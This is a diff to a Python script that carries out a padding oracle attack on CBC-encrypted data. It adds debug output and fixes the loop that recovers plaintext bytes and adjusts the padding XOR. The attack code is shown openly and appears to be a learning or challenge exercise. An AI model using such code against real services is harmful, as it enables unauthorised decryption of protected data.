@@ -32,9 +32,9 @@ def hasValidPadding(query):
 
     if status == 200:
         print "----" + str(status)
+        print "----" + query
         return True
     else:
-        print status
         return False
 
 """
@@ -162,14 +162,14 @@ def padding_attack():
                 block_plain = dec_target ^ decrypted_blocks
 
                 posistion = BLOCK_SIZE * decrypted_blocks + (BLOCK_SIZE - padding_num)
-
+                plaintext[posistion] = block_plain & 0xff
                 decrypted_byte += 1
 
-            print "decrypted_blocks: " + str(decrypted_blocks) + "decrypted_bytes: " + str(decrypted_bytes)
+            print "decrypted_blocks: " + str(decrypted_blocks) + " decrypted_bytes: " + str(decrypted_byte)
             print "hex represent:" + binascii.hexlify(plaintext)
 
 
-            test_block = test_block^get_padding(decrypted_byte + 1)
+            test_block = test_block ^ get_padding(decrypted_byte)
     
 
     reconstruct = ""
